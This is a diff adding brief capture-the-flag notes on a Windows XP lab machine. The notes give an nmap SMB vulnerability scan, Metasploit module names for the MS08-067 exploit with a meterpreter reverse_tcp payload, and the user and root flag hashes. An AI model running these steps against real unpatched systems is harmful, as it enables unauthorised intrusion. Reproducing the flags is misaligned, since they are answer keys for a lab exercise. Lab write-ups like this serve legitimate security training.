@@ -1,0 +1,29 @@
+8/Nov/2022 - 10.10.10.4 (E)(W)
+
+Tools Used:
+Nmap, Metasploit, SearchSploit.
+
+Surface Level Vulnerabilities:
+139,445/tcp - SMBv1 (Remote Code Execution) (Tested : Root Shell)
+
+Finding SMB Version with Metasploit:
+auxiliary(scanner/smb/smb_version)
+
+Windows Version: Windows XP SP3 English (AlwaysOn NX)
+
+Vulnerability Scan for SMB with Nmap:
+nmap --script smb-vuln* -p 139,445 10.10.10.4
+
+Exploits:
+MS17-010 (Tested : Fail - Windows Version Error)
+MS08-067 (Tested : Root Shell)
+
+Meterpreter Shell with Metasploit:
+exploit(windows/smb/ms08_067_netapi)
+payload(windows/meterpreter/reverse_tcp)
+
+Note: ‘more/type text.txt’ - to print a file in cmd
+
+User Flag: e69af0e4f443de7e36876fda4ec7644f
+Root Flag: 993442d258b0e0ec917cae9e695d5713
+
